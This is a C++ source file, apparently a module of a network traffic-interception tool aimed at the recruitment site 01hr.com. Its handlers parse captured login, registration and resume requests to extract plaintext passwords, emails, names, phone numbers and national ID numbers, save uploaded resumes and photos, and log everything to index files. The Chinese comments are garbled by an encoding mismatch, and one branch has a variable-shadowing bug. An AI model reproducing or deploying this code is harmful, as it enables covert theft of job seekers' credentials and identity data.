#include "StdAfx.h"
#include "EmployShuZiYingCai.h"

employ::ShuZiYingCai::ShuZiYingCai(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "����Ӣ��";	
}

employ::ShuZiYingCai::~ShuZiYingCai()
{
	
}

string employ::ShuZiYingCai::GetIdType(string idType)
{
	if (idType.length()==0){ idType="null";}
	if (idType=="0"){ idType="null";}
	if (idType=="1"){ idType="�й���½���֤";}
	if (idType=="2"){ idType="����֤";}
	if (idType=="4"){ idType="����";}
	if (idType=="3"){ idType="����";}
	return idType;
}

int employ::ShuZiYingCai::IsShuZiYingCai(HttpSession *http_session)
{
	//ע��(�û���ע��)
	if((http_session->m_Requestline.m_Host.Find("my.01hr.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/user/register.do")!=-1) )
	{
		return kPcWebRegisterUser;
	}
	//��¼
	if((http_session->m_Requestline.m_Host.Find("my.01hr.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/user/login.do")!=-1) )
	{
		return kPcWebLogin;
	}
	//������Ϣ(��׼�ͼ���)
	if((http_session->m_Requestline.m_Host.Find("my.01hr.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/job/ajax.do?op=baseInfo")!=-1) )
	{
		return kPcWebPaMain;
	}
	//������Ϣ(�����ͼ���)
	if((http_session->m_Requestline.m_Host.Find("my.01hr.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/job/ajax.do?op=saveSimpleResumeBaseInfo")!=-1) )
	{
		return kPcWebPaSimple;
	}
	//������Ϣ(΢�ͼ���)
	if((http_session->m_Requestline.m_Host.Find("my.01hr.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/resume/savePrivateResume.do")!=-1) )
	{
		return kPcWebPaPrivate;
	}
	//�ϴ�����(��������)
	if((http_session->m_Requestline.m_Host.Find("my.01hr.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/resume/affixAdd.do")!=-1) )
	{
		return kPcWebPaResume;
	}
	//�ϴ�ͷ��	
	if((http_session->m_Requestline.m_Host.Find("my.01hr.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/resume/newUploadPhoto.do")!=-1) )
	{
		return kPcWebPaPhoto;
	}
	//androidע��(�û���ע��)
	if((http_session->m_Requestline.m_Host.Find("open.01hr.com:8084")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/jobmap/register.do")!=-1) )
	{
		return kAndroidRegisterUser;
	}
	//android��¼
	if((http_session->m_Requestline.m_Host.Find("open.01hr.com:8084")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/jobmap/login.do")!=-1) )
	{
		return kAndroidLogin;
	}
	return 0;
}

int employ::ShuZiYingCai::Process(const char *packet,int action)
{
	//ע��(�û���ע��)
	if (action == kPcWebRegisterUser)
	{
		return PcWebRegisterUser(packet);
	}
	//��¼
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//������Ϣ(��׼�ͼ���)
	if (action == kPcWebPaMain)
	{
		return PcWebPaMain(packet);
	}
	//������Ϣ(�����ͼ���)
	if (action == kPcWebPaSimple)
	{
		return PcWebPaSimple(packet);
	}
	//������Ϣ(΢�ͼ���)
	if (action == kPcWebPaPrivate)
	{
		return PcWebPaPrivate(packet);
	}
	//�ϴ�����(��������)
	if (action == kPcWebPaResume)
	{
		return PcWebPaResume(packet);
	}
	//�ϴ�ͷ��
	if (action == kPcWebPaPhoto)
	{
		return PcWebPaPhoto(packet);
	}
	//androidע��(�û���ע��)
	if (action == kAndroidRegisterUser)
	{
		return AndroidRegisterUser(packet);
	}
	//android��¼
	if (action == kAndroidLogin)
	{
		return AndroidLogin(packet);
	}
	return 1;
}

//ע��(�û���ע��)
int employ::ShuZiYingCai::PcWebRegisterUser(const char *packet)
{
	//��ȷ��ȡ����  
	string src_data(packet);
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//�û���
    string login = ms_->GetValueFromMapByKey("login",true);
	//����
	string password = ms_->GetValueFromMapByKey("password",true);
	//����
	string email = ms_->GetValueFromMapByKey("email",true);
	if (login.empty() || password.empty() || email.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + 	login + "\r\n" +	//�˺�	
		"pass=" + 	password + "\r\n" + //����	
		"mid=" + 	email + "\r\n" + 	//����	
		"netmark=" + app_ + "\r\n" + 	//��Դ
		"state=ע��\r\n";
	WriteIndexFile();
	return 1;
}

//��¼
int employ::ShuZiYingCai::PcWebLogin(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//�˺�
    string UserName = ms_->GetValueFromMapByKey("login",true);
	//����
	string Password = ms_->GetValueFromMapByKey("password",true);
	if (UserName.empty() || Password.empty())
	{
		return 0;
	}
	output_text_ =
		"user="  + UserName + "\r\n" + 	//�˺�		
		"pass=" + Password + "\r\n" + 	//����
		"netmark=" + app_ + "\r\n" + 	//��Դ
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}


//������Ϣ(��׼�ͼ���)
int employ::ShuZiYingCai::PcWebPaMain(const char *packet)
{
	//��referer �л������
	BOOL falg;
	//�޸�	http://my.01hr.com/resume/modify.do?id=283996651
	//����	http://my.01hr.com/resume/modify.do?from=reg
	string referer(http_session_->m_Requestline.m_Referer.GetBuffer(0));
    if (referer.find("from=") != string::npos)	
    {
		falg = TRUE;
    }
	if (referer.find("id=") != string::npos)	
	{
		falg = FALSE;
	}
	//���ݲ���
	string src_data(packet);
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	string name = ms_->GetValueFromMapByKey("name",true);
	//�Ա�
	string gender = ms_->GetValueFromMapByKey("gender",true);
	if (gender == "1")
	{
		gender = "��";
	}
	if (gender == "2")
	{
		gender = "Ů";
	}
	//��������		//199101
	string birth = ms_->GetValueFromMapByKey("birthday",true);
	//�־�ס��		//3208
	string address = ms_->GetValueFromMapByKey("livingPlaceId",true);
	//�ֻ�����
	string mobile = ms_->GetValueFromMapByKey("mobile",true);
	//֤������
	string idTypeTemp = ms_->GetValueFromMapByKey("idType",true);
    string idType = GetIdType(idTypeTemp);
	//֤����
	string idCard = ms_->GetValueFromMapByKey("idCard",true);
	if (idCard.length() == 0)
	{
		idCard = "null";
	}
	if (falg)
	{
		output_text_ =
			"servername=" + name + "\r\n" + 	//����	       
			"sex=" + 	  	gender + "\r\n" + 	//�Ա�		
			"msg=" + 	  	birth + "\r\n" + 	//��������	
			"nick="	 + 	  	address + "\r\n" + 	//��ַ		
			"oid=" + 	  	mobile + "\r\n" + 	//�ֻ���
			"imsi=" + 	 	idType + "\r\n" + 	//֤������
			"appname=" + 	 idCard + "\r\n" + 	//֤����
			"netmark=" +	app_ + "\r\n" + 	//��Դ
			"state=����������Ϣ\r\n";
	}
	if (!falg)
	{
		output_text_ =
			"servername=" + name + "\r\n" + 	//����	       
			"sex=" + 	  	gender + "\r\n" + 	//�Ա�		
			"msg=" + 	  	birth + "\r\n" + 	//��������	
			"nick="	 + 	  	address + "\r\n" + 	//��ַ		
			"oid=" + 	  	mobile + "\r\n" + 	//�ֻ���
			"imsi=" + 	 	idType + "\r\n" + 	//֤������
			"appname=" + 	 idCard + "\r\n" + 	//֤����
			"netmark=" +	app_ + "\r\n" + 	//��Դ
			"state=�޸Ļ�����Ϣ\r\n";
	}
	WriteIndexFile();    
	return 1;
}


//������Ϣ(�����ͼ���)
int employ::ShuZiYingCai::PcWebPaSimple(const char *packet)
{
	//��referer �л������
	BOOL falg = FALSE;
	//�޸�	http://my.01hr.com/resume/simpleResumePreModify.do?id=30279
	//����	http://my.01hr.com/resume/modify.do?from=reg
// 	string referer(http_session_->m_Requestline.m_Referer.GetBuffer(0));
//     if (referer.find("from=") != string::npos)	
//     {
// 		falg = TRUE;
//     }
// 	if (referer.find("id=") != string::npos)	
// 	{
// 		falg = FALSE;
// 	}
	//���ݲ���
	string src_data(packet);
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	string name = ms_->GetValueFromMapByKey("baseInfoName",true);
	//�Ա�
	string gender = ms_->GetValueFromMapByKey("gender",true);
	if (gender == "1")
	{
		gender = "��";
	}
	if (gender == "2")
	{
		gender = "Ů";
	}
	//��������		//199101
	string birth = ms_->GetValueFromMapByKey("birthday",true);
	//�־�ס��		//3208
	string address = ms_->GetValueFromMapByKey("livingPlaceId",true);
	//�ֻ�����
	string mobile = ms_->GetValueFromMapByKey("mobile",true);
	//֤������
	string idTypeTemp = ms_->GetValueFromMapByKey("idType",true);
    string idType = GetIdType(idTypeTemp);
	//֤����
	string idCard = ms_->GetValueFromMapByKey("idCard",true);
	if (idCard.length() == 0)
	{
		idCard = "null";
	}
	if (falg)
	{
		output_text_ =
			"servername=" + name + "\r\n" + 	//����	       
			"sex=" + 	  	gender + "\r\n" + 	//�Ա�		
			"msg=" + 	  	birth + "\r\n" + 	//��������	
			"nick="	 + 	  	address + "\r\n" + 	//��ַ		
			"oid=" + 	  	mobile + "\r\n" + 	//�ֻ���
			"imsi=" + 	 	idType + "\r\n" + 	//֤������
			"appname=" + 	 idCard + "\r\n" + 	//֤����
			"netmark=" +	app_ + "\r\n" + 	//��Դ
			"state=����������Ϣ\r\n";
	}
	if (!falg)
	{
		output_text_ =
			"servername=" + name + "\r\n" + 	//����	       
			"sex=" + 	  	gender + "\r\n" + 	//�Ա�		
			"msg=" + 	  	birth + "\r\n" + 	//��������	
			"nick="	 + 	  	address + "\r\n" + 	//��ַ		
			"oid=" + 	  	mobile + "\r\n" + 	//�ֻ���
			"imsi=" + 	 	idType + "\r\n" + 	//֤������
			"appname=" + 	 idCard + "\r\n" + 	//֤����
			"netmark=" +	app_ + "\r\n" + 	//��Դ
			"state=�޸Ļ�����Ϣ\r\n";
	}
	WriteIndexFile();    
	return 1;
}


//������Ϣ(΢�ͼ���)
int employ::ShuZiYingCai::PcWebPaPrivate(const char *packet)
{
	//��referer �л������
	BOOL falg = FALSE;
	//�޸�	http://my.01hr.com/resume/editPrivateResume.do
	//����	http://my.01hr.com/resume/modify.do?from=reg
// 	string referer(http_session_->m_Requestline.m_Referer.GetBuffer(0));
//     if (referer.find("from=") != string::npos)	
//     {
// 		falg = TRUE;
//     }
// 	if (referer.find("id=") != string::npos)	
// 	{
// 		falg = FALSE;
// 	}
	//���ݲ���
	string src_data(packet);
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	string name = ms_->GetValueFromMapByKey("name",true);
	//�Ա�
	string gender = ms_->GetValueFromMapByKey("gender",true);
	if (gender == "1")
	{
		gender = "��";
	}
	if (gender == "2")
	{
		gender = "Ů";
	}
	//��������		//199101
	string birth = ms_->GetValueFromMapByKey("birthday",true);
	//�־�ס��		//3208
	string address = ms_->GetValueFromMapByKey("livingPlace",true);
	//�ֻ�����
	string mobile = ms_->GetValueFromMapByKey("mobile",true);
	//֤������
	string idTypeTemp = ms_->GetValueFromMapByKey("idType",true);
    string idType = GetIdType(idTypeTemp);
	//֤����
	string idCard = ms_->GetValueFromMapByKey("idCard",true);
	if (idCard.length() == 0)
	{
		idCard = "null";
	}
	if (falg)
	{
		output_text_ =
			"servername=" + name + "\r\n" + 	//����	       
			"sex=" + 	  	gender + "\r\n" + 	//�Ա�		
			"msg=" + 	  	birth + "\r\n" + 	//��������	
			"nick="	 + 	  	address + "\r\n" + 	//��ַ		
			"oid=" + 	  	mobile + "\r\n" + 	//�ֻ���
			"imsi=" + 	 	idType + "\r\n" + 	//֤������
			"appname=" + 	idCard + "\r\n" + 	//֤����
			"netmark=" +	app_ + "\r\n" + 	//��Դ
			"state=����������Ϣ\r\n";
	}
	if (!falg)
	{
		string 
			output_text_ =
			"servername=" + name + "\r\n" + 	//����	       
			"sex=" + 	  	gender + "\r\n" + 	//�Ա�		
			"msg=" + 	  	birth + "\r\n" + 	//��������	
			"nick="	 + 	  	address + "\r\n" + 	//��ַ		
			"oid=" + 	  	mobile + "\r\n" + 	//�ֻ���
			"imsi=" + 	 	idType + "\r\n" + 	//֤������
			"appname=" + 	idCard + "\r\n" + 	//֤����
			"netmark=" +	app_ + "\r\n" + 	//��Դ
			"state=�޸Ļ�����Ϣ\r\n";
	}
	WriteIndexFile();    
	return 1;
}

//�ϴ�����(��������)
int employ::ShuZiYingCai::PcWebPaResume(const char *packet)
{	
	from_ = "����Ӣ��null";
	
	//�ļ�����
	string boundary(http_session_->m_Requestline.m_strBoundary.GetBuffer(0));	
	BoundaryParser bp;
	bp.Parse(packet, http_session_->m_datalen, boundary); 
	BoundaryValue *bv = NULL;
	string key;
	key = bp.GetBoundaryKey("name=\"resourcefile\"");          
	bv = bp.GetBoundaryValue(key);	
	if (bv == NULL || key.empty())
	{
		return 0;
	}
	attachment_ = ms_->GetValueBetweenBeginEnd(key, "filename=\"", "\"", true);	
	string real_file_name = WriteTempRealFile(bv->ptr,attachment_.c_str(),bv->len);
	ConstructUploadAttachmentOuptputString();
	WriteIndexFile(real_file_name);
	return 1;
}

//�ϴ�ͷ��
int employ::ShuZiYingCai::PcWebPaPhoto(const char *packet)
{	
	from_ = "����Ӣ��null";
	//�ļ�����
	string boundary(http_session_->m_Requestline.m_strBoundary.GetBuffer(0));	
	BoundaryParser bp;
	bp.Parse(packet, http_session_->m_datalen, boundary); 
	BoundaryValue *bv = NULL;
	string key;
	key = bp.GetBoundaryKey("name=\"photoFile\"");          
	bv = bp.GetBoundaryValue(key);	
	if (bv == NULL || key.empty())
	{
		return 0;
	}
	attachment_ = ms_->GetValueBetweenBeginEnd(key, "filename=\"", "\"", true);	
	string real_file_name = WriteTempRealFile(bv->ptr,attachment_.c_str(),bv->len);
	ConstructUploadAttachmentOuptputString();
	WriteIndexFile(real_file_name);
	return 1;
}

//androidע��(�û���ע��)
int employ::ShuZiYingCai::AndroidRegisterUser(const char *packet)
{
	//��ȷ��ȡ����  
	string src_data(packet);
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//�û���
    string login = ms_->GetValueFromMapByKey("login",true);
	//����
	string password = ms_->GetValueFromMapByKey("password",true);
	//����
	string email = ms_->GetValueFromMapByKey("email",true);
	if (login.empty() || password.empty() || email.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + 	login + "\r\n" +	//�˺�	
		"pass=" + 	password + "\r\n" + //����	
		"mid=" + 	email + "\r\n" + 	//����	
		"netmark=" + app_ + "\r\n" + 	//��Դ
		"state=ע��\r\n";
	WriteIndexFile();
	return 1;
}

//android��¼
int employ::ShuZiYingCai::AndroidLogin(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//�˺�
    string UserName = ms_->GetValueFromMapByKey("login",true);
	//����
	string Password = ms_->GetValueFromMapByKey("password",true);
	if (UserName.empty() || Password.empty())
	{
		return 0;
	}
	output_text_ =
		"user="  + UserName + "\r\n" + 	//�˺�		
		"pass=" + Password + "\r\n" + 	//����
		"netmark=" + app_ + "\r\n" + 	//��Դ
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}
